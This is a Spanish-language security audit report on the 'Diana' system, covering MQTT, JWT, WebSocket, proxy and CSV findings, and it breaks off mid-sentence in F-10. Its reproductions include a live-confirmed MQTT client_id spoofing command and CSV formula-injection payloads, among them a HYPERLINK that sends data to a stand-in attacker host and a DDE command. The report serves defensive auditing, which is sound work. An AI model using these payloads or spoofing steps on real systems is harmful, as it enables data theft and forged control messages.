# Hallazgos de seguridad · Diana

**Revisión independiente (WP-10).** Redactado por el equipo de seguridad, que no ha escrito
ninguna de las líneas que audita y que **no corrige nada**: cada hallazgo se entrega al
paquete propietario. Fecha: 2026-07-21. Rama `develop`, commit `e459f7d`.

> **Nota de vigencia (2026-07-26, añadida por documentación, no por seguridad).** Este informe
> es del 2026-07-21 y su contenido **no se ha retocado**. Dos cosas hay que saber antes de
> leerlo:
> 1. **F-13 está superado:** los `Dockerfile` de backend y worker **ya existen** y el stack
>    **arranca y corre** en la VM 109 (8/8 contenedores `healthy` el 2026-07-26). Por tanto,
>    todas las reproducciones que aquí figuran como «no ejecutada, el backend no arranca»
>    (F-03, F-05, F-06, F-08, F-09, F-11, F-12…) **ya son ejecutables y siguen sin ejecutarse**.
>    Es el hallazgo X-19 de `STATUS.md`, y la re-verificación **está pendiente**.
> 2. **Lo crítico no ha cambiado:** F-02 (ACL por `client_id`, suplantación **confirmada en
>    vivo**), F-07 (sin TLS en ninguna capa) y F-17 (23 vulnerabilidades npm en el backend,
>    medidas el 2026-07-20 y **sin volver a medir**) siguen **abiertos y sin remediar**.

Contexto en [`threat-model.md`](threat-model.md); salida literal de los comandos en
[`evidence/`](evidence/); riesgos asumidos a propósito en
[`accepted-risks.md`](accepted-risks.md).

## Cómo leer esto

Cada hallazgo lleva una etiqueta de método que no es adorno:

- **OBSERVADO** — se ejecutó el comando y se vio la salida. Está en `evidence/`.
- **DEDUCIDO** — se leyó el código y se razonó sobre él, sin ejecutarlo.

La distinción importa porque **el stack no estaba en marcha cuando se recogió la
evidencia**: `docker ps` en la VM devolvió cero contenedores
(`evidence/vm-exposicion.md`), y no puede estarlo, porque faltan dos `Dockerfile`
(F-13). Todo lo relativo al comportamiento en ejecución del backend, del broker con
clientes reales y del firmware está DEDUCIDO. Ninguna afirmación de este documento
sobre "lo que pasa cuando arranca" ha sido presenciada.

Severidades: **Crítica** (compromete el resultado deportivo o los actuadores sin
credenciales privilegiadas), **Alta**, **Media**, **Baja**. Se justifican una a una.

### Índice

| # | Hallazgo | Sev. | Activo | Paquete | Método |
|---|---|---|---|---|---|
| F-01 | El `.gitignore` no cubre `infrastructure/mosquitto/passwd` | Alta | A2 | WP-00/WP-01 | **CORREGIDO 2026-08-13 · P0-2** (el patrón llevaba barra y se anclaba a la raíz) |
| F-02 | La ACL de MQTT autoriza por `client_id`: suplantación de módulo | Crítica | A1, A4 | WP-01 | **CONFIRMADO EN VIVO (2026-07-21)** |
| F-03 | MQTT 1883 en claro y abierto a toda la LAN | Alta | A2, A1 | WP-01, WP-08 | **CERRADO (mitad MQTT) 2026-08-13 · P0-2**; ver nota en su sección |
| F-04 | El contrato de variables de entorno está roto: `JWT_SECRET` nunca llega al backend | Alta | A3 | WP-01, WP-02 | OBSERVADO + DEDUCIDO |
| F-05 | WebSocket `/live` sin autenticación y con CORS reflejado | Alta | A1, A6 | WP-02 | DEDUCIDO |
| F-06 | Swagger `/docs` se publica sin autenticación ni condición de entorno | Media | A6 | WP-02 | DEDUCIDO |
| F-07 | Todo el tráfico HTTP del panel y la API va sin TLS | Alta | A3, A6 | WP-01, WP-08 | OBSERVADO |
| F-08 | El proxy enruta mal `/api/` y `/ws/`: la zona de rate limit del login no protege el login | Media | A3 | WP-01, WP-02 | DEDUCIDO |
| F-09 | El CSV exportado no neutraliza fórmulas | Media | A6 | WP-02 | DEDUCIDO |
| F-10 | El perfil `monitoring` monta la raíz del host y publica cAdvisor en todas las interfaces | Media | A7 | WP-01 | OBSERVADO |
| F-11 | La contraseña inicial del administrador se escribe en el log del contenedor | Media | A3, A7 | WP-02 | DEDUCIDO |
| F-12 | Los permisos viajan dentro del JWT y no hay revocación | Media | A6 | WP-02 | DEDUCIDO |
| F-13 | Faltan los `Dockerfile` de backend y worker: el stack no se puede ejecutar | Alta | todos | WP-01, WP-02, WP-08 | **SUPERADO (2026-07-26)** — los Dockerfile existen y el stack corre; ver nota de cabecera y X-19 |
| F-14 | Firmware sin secure boot ni cifrado de flash | Alta | A2, A5 | WP-04 | DEDUCIDO |
| F-15 | `diana-admin` con `NOPASSWD:ALL`, grupo `docker` y una sola clave SSH | Media | A7 | WP-08 | OBSERVADO |
| F-16 | Comandos aceptados sin verificar caducidad cuando no hay hora sincronizada | Media | A4 | WP-04 | DEDUCIDO |
| F-17 | Dependencias vulnerables sin resolver en backend, worker y simuladores | Media | A7 | WP-02, WP-05, WP-07 | OBSERVADO |
| F-18 | `fail2ban` instalado pero inactivo | Baja | A7 | WP-08 | OBSERVADO |

---

## F-01 · El `.gitignore` no cubre `infrastructure/mosquitto/passwd`

**Severidad: Alta.** El fichero contiene los hashes de todas las credenciales MQTT de los
módulos y del backend (A2). Publicarlos en un repositorio equivale a entregar el bus de
control a quien pueda descifrarlos o a quien tenga acceso al repositorio.

**Activo:** A2 (credenciales MQTT).

**Evidencia — OBSERVADO** (`evidence/secretos-y-gitignore.md`):

`.gitignore:10` contiene `mosquitto/passwd`. Un patrón con barra interior está anclado a la
raíz del repositorio, así que sólo casa con `<raíz>/mosquitto/passwd`, ruta que no existe.
La ruta real es `infrastructure/mosquitto/passwd`.

```
$ git check-ignore -v infrastructure/mosquitto/passwd
infrastructure/mosquitto/passwd    NO IGNORADO
```

En la VM de producción, `/opt/diana`, el fichero **ya existe y ya está sin ignorar**:

```
-rw------- 1 diana-admin diana-admin 1599 Jul 20 21:30 infrastructure/mosquitto/passwd
$ git status --porcelain
?? infrastructure/mosquitto/passwd
```

**Reproducción:** `git check-ignore -v infrastructure/mosquitto/passwd` desde la raíz del
repositorio. Código de salida 1 y sin regla emparejada = no ignorado.

**Impacto real:** hoy no hay fuga: `git log -p --all` filtrado por patrones de secreto
devuelve cero coincidencias, y el fichero está como no rastreado, no como añadido. El
impacto es que **un solo `git add -A` en la VM lo commitea**, y el repositorio es el
artefacto que WP-09 va a publicar. Los permisos `0600` protegen del vecino en la VM, no de
git.

**Mitigación:** sustituir la línea 10 por `**/mosquitto/passwd` (o simplemente
`mosquitto/passwd` sin ancla, es decir `**/passwd` acotado). Verificar después con
`git check-ignore -v`, que es la única comprobación que vale. Añadir la comprobación al CI
(WP-07) para que no vuelva a pasar desapercibida.

---

## F-02 · La ACL de MQTT autoriza por `client_id`: cualquier módulo puede suplantar a otro

**Severidad: Crítica.** Es el hallazgo más grave del informe. Con **unas credenciales
cualesquiera de módulo** se falsifican impactos en nombre de cualquier otro módulo, es
decir, se decide quién gana la competición (A1), y si el módulo suplantado es el
coordinador, se controlan los actuadores (A4) de un sistema que dispara proyectiles.

**Activos:** A1 (integridad de los eventos de impacto), A4 (control de actuadores).

**Evidencia — DEDUCIDO** (`evidence/mqtt-acl.md`, lectura de
`infrastructure/mosquitto/acl` y `infrastructure/mosquitto/mosquitto.conf`):

`infrastructure/mosquitto/acl:51-56` y `:62-65` usan el patrón `%c`:

```
51:pattern write targets/v1/module/%c/presence
54:pattern write targets/v1/module/%c/hit
62:pattern read  targets/v1/module/%c/command
```

En Mosquitto, `%c` se sustituye por el **`client_id` del paquete CONNECT**, un valor que
elige libremente el cliente y que el broker no valida contra nada. `%u`, en cambio, es el
usuario autenticado con contraseña. La ACL usa el primero.

La directiva que ata uno a otro no está puesta:

```
$ grep -c use_username_as_clientid infrastructure/mosquitto/mosquitto.conf
0
```

**Reproducción — OBSERVADO / CONFIRMADO EN VIVO (2026-07-21, broker de la VM 109).**
Con dos usuarios de prueba (`module-m1`, `module-m2`) y el `backend` como suscriptor
autorizado sobre `#`:

```
# Ataque: credenciales de m1, pero client_id = m2, publicando en el tópico de m2
$ mosquitto_pub -h mosquitto -u module-m1 -P <pw_m1> -i m2 \
    -t targets/v1/module/m2/hit -m '{"suplantado_por":"m1"}'
pub-ok
# El suscriptor backend, escuchando targets/v1/module/m2/hit, recibió:
RECIBIDO >>> {"suplantado_por":"m1"}      <<< F-02 CONFIRMADO
```

El broker **aceptó** que las credenciales de m1 publicaran en el subárbol de m2 sólo con
declarar `client_id=m2`. Control negativo (parte del `test-acl.sh`): con `client_id=m1`
publicando en el tópico de m2, el broker **sí** rechaza (comprobación 3 de `test-acl.sh`,
`[PASS]`). Es decir, la ACL aísla por `client_id`, no por usuario, exactamente como se
dedujo. Los usuarios de prueba se eliminaron del `passwd` tras la comprobación.

**Nota sobre `test-acl.sh`:** de sus 7 comprobaciones, 5 pasaron; las 2 que fallaron
(`[FAIL]` en «m1 escribe su propio presence» y «backend escribe system/status») son
**falsos negativos del arnés** —una carrera entre el suscriptor detector y el publicador—,
no fallos de ACL: la escritura del propio presence de m1 se verificó a mano y funciona.
Las 4 comprobaciones de denegación (aislamiento entre módulos, no auto-escribir
`config/desired`/`command`/`ota`) pasaron correctamente: esa parte de la ACL **funciona**.

**Mitigación — no es una línea, es una decisión de arquitectura (para el supervisor).**
La mitigación evidente sería `use_username_as_clientid true`, que fuerza `client_id` = usuario
autenticado. Pero **rompe el enrutado tal como está el contrato**: el usuario mosquitto es
`module-m1` (con prefijo, por §8) mientras el `client_id` y el `module_id` de los tópicos son
`m1` (sin prefijo). Al forzar `client_id=module-m1`, el patrón `%c` de la ACL pasaría a exigir
`targets/v1/module/module-m1/...`, que no casa con los tópicos reales `.../module/m1/...`, y el
módulo no podría escribir ni lo suyo. La corrección correcta exige **alinear
usuario = client_id = module_id** (quitar el prefijo `module-` del nombre de usuario) en el
contrato §8, la ACL, `generate-users.sh`, el firmware y el simulador, y sólo entonces activar
`use_username_as_clientid true`. Es un cambio incompatible que debe pasar por el supervisor
(afecta a la identidad MQTT de todo el sistema). Hasta entonces, F-02 sigue **abierto y
confirmado**; TLS con certificado de cliente por módulo (F-07) sería una defensa
complementaria.

**Impacto real:** el atacante necesita una credencial válida de módulo, que obtiene por
tres vías ya documentadas: capturando un CONNECT en claro en la LAN (F-03), teniendo un
módulo en la mano (F-14), o siendo un módulo legítimo comprometido (T2). Conseguida una
sola, alcanza los seis tópicos de escritura de **todos** los módulos: `hit`, `status`,
`presence`, `telemetry`, `diagnostic` y `config/reported`. El firmware sí comprueba
`module_id` en los comandos que recibe, pero eso no defiende el sentido contrario: quien
falsifica es el publicador, y el broker no le pregunta quién es.

Matiz que conviene registrar: el bloque del coordinador
(`infrastructure/mosquitto/acl:86-89`) está **comentado** y, cuando se active, usa
`user module-<id>`, es decir autorización por usuario. Ese bloque está bien planteado. El
agujero es exclusivo de las reglas `pattern` genéricas.

Y lo que la ACL sí impide, y merece decirse porque es diseño correcto: ningún módulo puede
escribir su propio `config/desired` ni su propio `ota`, ni siquiera con el `client_id`
suplantado. La escalada de F-02 llega hasta falsear datos y, con el coordinador, emitir
comandos; **no** llega a instalar firmware.

**Mitigación:** añadir `use_username_as_clientid true` a `mosquitto.conf`. Con esa
directiva el broker reescribe el `client_id` con el usuario autenticado antes de evaluar la
ACL, y `%c` pasa a ser tan fiable como `%u`. Requiere que el usuario MQTT de cada módulo se
llame exactamente igual que su `module_id`, o que la ACL pase a `%u` y se renombren los
usuarios. La decisión es de WP-01; ambas cierran el hallazgo. Verificar después con la
reproducción de arriba, que debe pasar a fallar.

---

## F-03 · MQTT 1883 en claro y abierto a toda la LAN

> **ESTADO (2026-08-13): CERRADO en su mitad MQTT por P0-2.** Todo lo que sigue
> describe la situación ANTES del hotfix `hotfix/p02-tls-6da16d4` y se conserva
> como registro histórico de lo medido, no como estado actual. Hoy: el broker
> sirve en 8883 con CA propia, el 1883 no se publica al host, el backend valida
> CA y nombre y aborta si la URL va en claro con `NODE_ENV=production`.
> El `listener 1883` interno a la red de Docker, que se citaba aquí como
> pendiente, se eliminó también el 2026-08-13 al dotar de TLS a `test-acl.sh`,
> que era su única razón de ser. Ya no existe ningún camino MQTT en claro.
> Sigue abierto: la validación de CA en el **firmware** de los módulos (fuera
> del alcance de P0-2, y hay que decirlo en vez de dejarlo caer), la regla nft
> que aún abre el 1883 a la LAN sin que nada escuche. DUEÑO: el operador;
> MOMENTO: intervención propia `P0-2-POST-INTEGRATION-FIREWALL`, después de la
> celda 16 y del rollback/reaplicación, nunca durante las celdas 10-16. El
> script `infrastructure/provisioning/04-firewall.sh` ya está corregido en el
> repo pero NINGÚN paso del despliegue lo reaplica: hacerlo es un acto
> deliberado, porque reescribe el ruleset entero de una VM cuyo único canal
> administrativo es el agente QEMU y la mitad HTTP de F-07 (nginx sigue en
> claro).

**Severidad: Alta.** Es el habilitador de F-02: convierte a un actor sin credenciales (T1)
en un actor con credenciales de módulo (T3) mediante captura pasiva.

**Activos:** A2 (credenciales MQTT), A1 (por encadenamiento con F-02).

**Evidencia — OBSERVADO** (`evidence/vm-exposicion.md`, `evidence/mqtt-acl.md`):

Regla de cortafuegos en la VM, `nft list ruleset`:

```
ip saddr 192.168.1.0/24 tcp dport 1883 accept
```

Las únicas líneas TLS de `mosquitto.conf` están comentadas (`:57-60` para el listener 8883,
`:77-79` para el WebSocket). El listener activo es `mosquitto.conf:45`, `listener 1883`, sin
`cafile`/`certfile`/`keyfile`.

**Reproducción:** `tcpdump -i <iface> -A 'tcp port 1883'` en cualquier equipo de la LAN con
visibilidad del tráfico, y arrancar un módulo o el backend. El paquete CONNECT de MQTT 3.1.1
lleva usuario y contraseña como cadenas de longitud prefijada, sin cifrar ni ofuscar. No
ejecutado: en el momento de la recogida no había ningún cliente conectado (el stack no
está en marcha, F-13).

**Impacto real:** en una LAN doméstica con WiFi, la captura no requiere ARP spoofing en
muchos escenarios, y con él es trivial. Una sola credencial capturada abre F-02. Además,
todo el tráfico de juego y de control es legible: impactos, telemetría y comandos.

**Mitigación:** activar el listener TLS ya preparado en `mosquitto.conf:57-61` con una CA
propia, distribuir el certificado de CA a los módulos por NVS y **retirar el listener 1883
en claro** (no basta añadir 8883: mientras 1883 siga abierto, el atacante fuerza el
downgrade en el cliente que controle). Coordinar con WP-04 (el firmware necesita el
almacén de confianza) y WP-05 (simuladores). Mientras no haya TLS, la regla nft de 1883
debería acotarse a las IP de los módulos en lugar de a `192.168.1.0/24` entero: es una
reducción de superficie real y barata (WP-08).

---

## F-04 · El contrato de variables de entorno está roto: `JWT_SECRET` nunca llega al backend

**Severidad: Alta.** De este hallazgo depende el dictamen (a) del encargo. La evidencia
inicial era contradictoria y aquí se resuelve.

**Activo:** A3 (secreto de firma JWT).

**Evidencia — OBSERVADO (el `.env` y el `compose.yml`) + DEDUCIDO (el comportamiento en
arranque, que no se ha presenciado).**

Lo que el código lee (`server/backend/src/config/configuration.ts:47-63`):

```ts
const secret = process.env.JWT_SECRET ?? '';
if (!secret && process.env.NODE_ENV === 'production') {
  throw new Error('JWT_SECRET no está definido. El backend no arranca en producción sin un secreto explícito.');
}
...
  corsOrigins: (process.env.CORS_ORIGINS ?? '').split(',')...
  jwt: { secret: secret || 'desarrollo-inseguro-cambiar', ... }
```

Lo que `compose.yml:119-131` entrega al servicio `backend`:

```
NODE_ENV, PORT, DATABASE_URL, MQTT_HOST, MQTT_PORT, MQTT_USERNAME,
MQTT_PASSWORD, SESSION_SECRET, CORS_ORIGIN, LOG_LEVEL, TZ
```

Comparando ambas listas, el desajuste es sistemático y afecta a cinco variables:

| El backend lee | `compose.yml` entrega | Efecto |
|---|---|---|
| `JWT_SECRET` | *(nada)* | El secreto nunca llega |
| `CORS_ORIGINS` (plural) | `CORS_ORIGIN` (singular) | La lista queda vacía |
| `MQTT_URL` | `MQTT_HOST` + `MQTT_PORT` | ~~Cae al valor por defecto `mqtt://mosquitto:1883`~~ · **CORREGIDO 2026-08-13 (P0-2)**: la URL se construye con `MQTT_PROTOCOL/HOST/PORT` (`mqtts`/8883 por defecto). `MQTT_URL` conserva precedencia absoluta y es hoy la escapatoria a vigilar |
| *(nada)* | `SESSION_SECRET` | Variable muerta |
| `DIANA_ADMIN_USERNAME/PASSWORD/EMAIL` | *(nada)* | Contraseña de admin siempre autogenerada (ver F-11) |

Y en el `.env` real de la VM (`evidence/vm-exposicion.md`, sólo nombres y longitudes, nunca
valores):

```
NODE_ENV=production
BACKEND_CORS_ORIGIN=http://192.168.1.209:8080
-- JWT_SECRET presente? 0
```

**Determinación exacta de cuándo arranca con secreto inseguro.** El `throw` de la línea 51
exige las dos condiciones a la vez: `JWT_SECRET` vacío **y** `NODE_ENV === 'production'`.
Por tanto:

1. `NODE_ENV=production` y sin `JWT_SECRET` → **el backend no arranca**. Lanza en
   `loadConfiguration()`, durante la construcción del módulo de configuración, antes de
   escuchar en el puerto.
2. `NODE_ENV` con cualquier otro valor (`development`, `test`, vacío, ausente) y sin
   `JWT_SECRET` → **arranca y firma los JWT con la cadena literal
   `desarrollo-inseguro-cambiar`**, que está publicada en el repositorio. Cualquiera que
   lea el código forja un token de administrador.

El caso 2 es una puerta trasera de una sola variable de entorno: basta que alguien ponga
`NODE_ENV=development` para depurar un problema, y el sistema entero queda abierto sin que
ningún log lo advierta. El fallo cerrado sólo cubre una de las dos ramas.

**Qué ocurre HOY en la VM 109.** `NODE_ENV=production` en `/opt/diana/.env`, `compose.yml`
lo propaga (`NODE_ENV: ${NODE_ENV:-production}`) y `JWT_SECRET` no está definido en ninguno
de los dos. La conclusión es el **caso 1**: si el stack se levantara ahora mismo, el
contenedor `backend` entraría en fallo de arranque y `restart: unless-stopped` lo dejaría en
bucle de reinicio. Esto es DEDUCIDO, no observado: no se ha levantado el stack, y de hecho
no puede levantarse (F-13). Lo que sí está observado es que las tres condiciones que llevan
a ese resultado se cumplen.

**Impacto real:** hoy, indisponibilidad, no compromiso. Mañana, en cuanto alguien intente
arreglar el bucle de reinicio por el camino corto —bajar `NODE_ENV`— se convierte en
compromiso total de A3, y con él de todo el panel y la API.

**Mitigación (WP-01 y WP-02, coordinadas):**
1. `compose.yml` debe pasar `JWT_SECRET: ${BACKEND_JWT_SECRET:?falta JWT_SECRET}` — con la
   sintaxis `:?`, que hace fallar `docker compose` en el arranque con un mensaje claro en
   lugar de fallar dentro del contenedor.
2. Alinear los otros cuatro nombres: `CORS_ORIGINS`, `MQTT_URL`, retirar `SESSION_SECRET` o
   darle uso, y decidir si `DIANA_ADMIN_*` se pasa.
3. En el código, **eliminar el valor de reserva `'desarrollo-inseguro-cambiar'`** y hacer
   que la ausencia de `JWT_SECRET` falle en todos los entornos. Un desarrollador puede
   generarse un secreto con una línea; el coste de la comodidad es esta puerta trasera.
4. Añadir a `.env.example` las variables reales y a WP-07 una prueba que compare la lista de
   `process.env.*` del código con las claves del `compose.yml`.

---

## F-05 · WebSocket `/live` sin autenticación y con CORS reflejado

**Severidad: Alta.** Cualquiera en la LAN, sin credencial alguna, lee en directo todo el
flujo de eventos del sistema.

**Activos:** A1 (visibilidad total de los eventos de impacto), A6 (nombres de jugadores en
los eventos).

**Evidencia — DEDUCIDO** (`server/backend/src/modules/websocket/live.gateway.ts:20` y
siguientes, `evidence/analisis-codigo.md`):

```ts
@WebSocketGateway({ namespace: '/live', cors: { origin: true } })
export class LiveGateway implements EventPublisherPort, OnGatewayConnection, OnGatewayDisconnect {
  handleConnection(client: Socket): void {
    this.logger.debug(`Cliente conectado al canal en directo: ${client.id}`);
  }
  @SubscribeMessage('subscribe')
  onSubscribe(client: Socket, payload: { system_id?: string }): { subscribed: string } {
    const room = payload?.system_id ? `system:${payload.system_id}` : 'system:all';
    void client.join(room);
    return { subscribed: room };
  }
```

Dos defectos independientes en una misma línea y un método:

1. **Sin autenticación.** `handleConnection` registra la conexión y no la valida. No hay
   `@UseGuards`, no se lee el `handshake.auth`, no se verifica ningún JWT. Los guards
   globales de `app.module.ts:77-80` (`JwtAuthGuard`, `PermissionsGuard`) son guards HTTP y
   no se aplican al transporte WebSocket sin adaptación explícita. `onSubscribe` acepta el
   `system_id` que le den y, si no le dan ninguno, mete al cliente en `system:all`: la sala
   que lo ve todo.
2. **`cors: { origin: true }`** en Socket.IO significa reflejar el `Origin` de la petición
   en `Access-Control-Allow-Origin`, es decir, aceptar cualquier origen. Combinado con la
   ausencia de autenticación, una página web abierta por un operador en su portátil puede
   conectarse al canal y exfiltrar el flujo, sin credenciales que robar.

**Reproducción** (no ejecutada, el backend no arranca — F-13, F-04):

```
npx wscat -c 'ws://192.168.1.209:8080/live/?EIO=4&transport=websocket'
# y enviar el evento 'subscribe' con payload vacío
```

Debe devolver `{ "subscribed": "system:all" }` sin haber presentado ninguna credencial.

**Impacto real:** T1 —alguien en la LAN sin credenciales— pasa de no ver nada a ver la
competición entera en tiempo real, con nombres de jugadores. No permite escribir: el gateway
sólo expone `subscribe`. El daño es de confidencialidad, no de integridad.

**Mitigación (WP-02):** validar el JWT en `handleConnection` a partir de
`client.handshake.auth.token`, desconectar (`client.disconnect(true)`) si no es válido, y
comprobar el permiso de lectura del sistema en `onSubscribe` antes del `join`. Sustituir
`cors: { origin: true }` por la misma lista de orígenes que usa el REST
(`config.corsOrigins`, ver F-04). Nótese que ambos arreglos son necesarios: con
autenticación pero CORS abierto, un origen hostil aún puede intentar reutilizar un token; con
CORS cerrado pero sin autenticación, un cliente que no sea navegador entra igual, porque CORS
es una defensa de navegador, no del servidor.

---

## F-06 · Swagger `/docs` se publica sin autenticación ni condición de entorno

**Severidad: Media.** No expone datos, expone el mapa completo del sistema.

**Activo:** A6 indirectamente; principalmente reconocimiento previo al ataque.

**Evidencia — DEDUCIDO** (`server/backend/src/main.ts:36` y
`server/backend/src/swagger.ts:31-37`):

```ts
// main.ts
setupSwagger(app);            // sin condición de NODE_ENV

// swagger.ts
export function setupSwagger(app: INestApplication): OpenAPIObject {
  const document = buildOpenApiDocument(app);
  SwaggerModule.setup('docs', app, document, {
    swaggerOptions: { persistAuthorization: true },
  });
```

La llamada es incondicional: no hay `if (process.env.NODE_ENV !== 'production')` ni guard.
La ruta `/docs` queda fuera del prefijo global `api` porque `SwaggerModule.setup` monta en
la raíz, y los guards globales de Nest no cubren la UI de Swagger, que la sirve el propio
módulo.

**Reproducción** (no ejecutada, F-13): `curl -s http://192.168.1.209:8080/api/docs` una vez
el stack arranque. La ruta exacta depende de F-08: el proxy reescribe `/api/` a `/`, así que
`/api/docs` llega al backend como `/docs`.

**Impacto real:** un actor de la LAN obtiene el inventario completo de endpoints, esquemas
de petición y respuesta, y roles esperados, sin autenticarse. No es acceso a datos; es
ahorrarle al atacante toda la fase de descubrimiento. `persistAuthorization: true` añade un
matiz menor: la UI guarda el token introducido en el `localStorage` del navegador, donde
sobrevive al cierre de pestaña.

**Mitigación (WP-02):** condicionar `setupSwagger(app)` a que `NODE_ENV !== 'production'`, o
—si se quiere la documentación disponible en la instalación, que es defendible— protegerla
con Basic Auth en el proxy (WP-01), como se hace con el resto de superficies de
administración. Retirar `persistAuthorization`.

---

## F-07 · Todo el tráfico HTTP del panel y la API va sin TLS

**Severidad: Alta.** El JWT de administrador y la contraseña de login viajan en claro por la
misma LAN en la que F-03 ya demuestra que se puede escuchar.

**Activos:** A3 (el token es la credencial efectiva), A6.

**Evidencia — OBSERVADO** (`infrastructure/proxy/nginx.conf`, `compose.yml:49-52`,
`evidence/vm-exposicion.md`):

El único `server` activo escucha en texto plano: `nginx.conf:56`, `listen 8080
default_server;`. El bloque HTTPS completo está comentado, `nginx.conf:136-144`, incluida la
cabecera HSTS de la línea 142. En `compose.yml:50` sólo se publica
`"${PROXY_HTTP_PORT:-8080}:8080"`; la línea del 8443 está comentada. Y el `.env` de la VM
apunta el panel a `http://192.168.1.209:8080`.

El cortafuegos, en cambio, abre 80 y 443 (`ip saddr 192.168.1.0/24 tcp dport { 80, 443 }
accept`), puertos en los que hoy no escucha nada: `ss -tulpn` en la VM sólo muestra 22, 53
locales, 5355 y 41641. La regla está preparada para un TLS que no existe.

**Impacto real:** quien pueda capturar tráfico en la LAN —el mismo actor de F-03— obtiene el
`access_token` de cualquier sesión activa y lo reutiliza durante las 8 horas que dura
(F-12), con todos los permisos de su portador. También obtiene usuario y contraseña en el
POST de `/api/auth/login`. Las cabeceras de seguridad de `nginx.conf:59-64` están bien
puestas y son completas, pero ninguna de ellas defiende de un atacante que lee el cable;
sólo el cifrado lo hace.

**Mitigación (WP-01 y WP-08):** activar el bloque 8443 con un certificado de CA propia
—Diana no tiene salida a Internet, así que Let's Encrypt no aplica—, publicar el puerto en
`compose.yml`, redirigir 8080 a 8443, activar la cabecera HSTS de la línea 142 y actualizar
`BACKEND_CORS_ORIGIN` al esquema `https`. Sin TLS, el resto del endurecimiento HTTP defiende
un canal que cualquiera puede leer.

---

## F-08 · El proxy enruta mal `/api/` y `/ws/`: la zona de rate limit del login no protege el login

**Severidad: Media.** El efecto de seguridad es concreto: la defensa contra fuerza bruta en
el login no se aplica al login.

**Activo:** A3.

**Evidencia — DEDUCIDO** (`infrastructure/proxy/nginx.conf:70-105`,
`server/backend/src/main.ts:23`, `live.gateway.ts:20`):

El backend fija prefijo global `api` (`main.ts:23`, `app.setGlobalPrefix(config.globalPrefix)`
con `globalPrefix = process.env.API_PREFIX ?? 'api'`), de modo que sus rutas reales son
`/api/auth/login`, `/api/hits`, etc.

El proxy, en cambio, **elimina** el prefijo, porque `proxy_pass` con barra final reescribe:

```
70:  location /api/       →  proxy_pass http://backend:3000/;        # /api/hits → /hits
83:  location /api/auth/  →  proxy_pass http://backend:3000/auth/;   # /api/auth/login → /auth/login
95:  location /ws/        →  proxy_pass http://backend:3000/ws/;
```

`/hits` y `/auth/login` no existen en el backend: existen `/api/hits` y `/api/auth/login`.
Y el namespace del WebSocket es `/live` (`live.gateway.ts:20`), no `/ws/`.

Consecuencia de seguridad, que es lo que corresponde a este informe: la zona estricta
`api_auth` (5 r/s, `nginx.conf:46` y `:84`) está atada a la ruta `/api/auth/`. Cuando el
enrutado se corrija por el camino evidente —quitar la barra final del `proxy_pass` de la
línea 73 para que `/api/` pase intacto—, la petición de login entrará por `location /api/`,
que es el prefijo más largo que casa salvo que se conserve el bloque específico, y quedará
bajo la zona general de 20 r/s con `burst=40`. La protección contra fuerza bruta contra
credenciales pasa de 5 a 20 peticiones por segundo sin que nadie se dé cuenta, porque el
bloque `/api/auth/` seguirá ahí, aparentemente correcto.

El `ThrottlerGuard` global del backend (`app.module.ts:44`, `ttl: 60000, limit: 300`) no
compensa: 300 intentos por minuto contra un login no es un límite antifuerza bruta, y además
cuenta por IP vista por el backend, que detrás del proxy es la del proxy salvo que se
configure `trust proxy` — cosa que no se hace en `main.ts`.

**Reproducción** (no ejecutada, F-13): tras arreglar el enrutado, `for i in $(seq 1 30); do
curl -s -o /dev/null -w '%{http_code} ' -X POST http://<vm>:8080/api/auth/login -d '...';
done`. Contar cuántos 429 aparecen y a partir de qué ritmo.

**Impacto real:** hoy nulo, porque nada funciona (F-13). El hallazgo se registra ahora
precisamente para que la corrección funcional de WP-01/WP-02 no destruya el control de
seguridad de rebote.

**Mitigación:** al corregir el enrutado, verificar explícitamente que `/api/auth/login` sigue
cayendo en la zona `api_auth`; si se opta por `proxy_pass http://backend:3000;` sin barra,
el bloque `location /api/auth/` debe conservarse y su `proxy_pass` también sin barra.
Corregir `/ws/` a `/live/`. Configurar `app.set('trust proxy', 1)` para que el throttler del
backend vea la IP real. Añadir una prueba en WP-07 que compruebe el 429.

---

## F-09 · El CSV exportado no neutraliza fórmulas

**Severidad: Media.** Ejecución de código en el equipo de un tercero, con interacción del
usuario y advertencia previa del programa de hoja de cálculo.

**Activo:** A6 (y el puesto de quien abre el fichero).

**Evidencia — DEDUCIDO** (`server/backend/src/domain/exports/csv.ts:12-22`):

```ts
export function escapeCell(value: CsvValue): string {
  if (value === null || value === undefined) return '';
  const text = ...;
  if (/[",\r\n]/.test(text)) return `"${text.replace(/"/g, '""')}"`;
  return text;
}
```

El escapado cubre RFC 4180 correctamente —comillas, comas y saltos de línea— y eso está
bien. Lo que no cubre son los cuatro caracteres que Excel, LibreOffice Calc y Google Sheets
interpretan como inicio de fórmula al abrir el fichero: `=`, `+`, `-` y `@`. Entrecomillar
no ayuda: la comilla es sintaxis CSV, se retira al parsear, y la celda resultante sigue
empezando por `=`.

Además `toCsv` (`:33`) escribe el BOM UTF-8 opcional, cuya razón de ser es que Excel abra
el fichero directamente en lugar de pasar por el asistente de importación. Es decir, el
camino que se ha optimizado es exactamente el que ejecuta las fórmulas.

**Reproducción** (no ejecutada, F-13): crear un jugador cuyo nombre sea
`=HYPERLINK("http://atacante/"&A1,"click")` o `=cmd|'/c calc'!A0`, exportar el CSV de
resultados y abrirlo en Excel. La celda deja de ser texto.

**Impacto real:** el vector es T4, un operador legítimo del panel con permiso para crear
jugadores o equipos, y la víctima es otro operador o cualquiera a quien se le pase el
informe. Las hojas de cálculo modernas piden confirmación antes de ejecutar contenido
externo, lo que rebaja la severidad de alta a media, pero la variante `HYPERLINK` exfiltra
datos con un solo clic y sin diálogo de macros.

**Mitigación (WP-02):** en `escapeCell`, si el texto empieza por `=`, `+`, `-`, `@`, tabulador
o retorno de carro, anteponer una comilla simple y entrecomillar la celda. Es un cambio de
tres líneas en una función pura que ya tiene pruebas. Nótese que el prefijo cambia el valor
literal del CSV: si alguna herramienta consume estos ficheros mediante parseo automático,
hay que avisarla (WP-11 debería comprobarlo).

---

## F-10 · El perfil `monitoring` monta la raíz del host y publica cAdvisor en todas las interfaces

**Severidad: Media.** Mitigado hoy por el cortafuegos, no por el diseño del contenedor.

**Activo:** A7 (la VM).

**Evidencia — OBSERVADO** (`compose.yml:474-487`):

```yaml
  cadvisor:
    profiles: ["monitoring"]
    image: gcr.io/cadvisor/cadvisor:v0.49.1
    ports:
      - "${MONITORING_HTTP_PORT:-9090}:8080"
    volumes:
      - /:/rootfs:ro
      - /var/run:/var/run:ro
```

Dos cosas. La primera: `/:/rootfs:ro` da al contenedor lectura de **todo** el sistema de
ficheros del anfitrión, incluidos `/opt/diana/.env`, `/etc/shadow` y
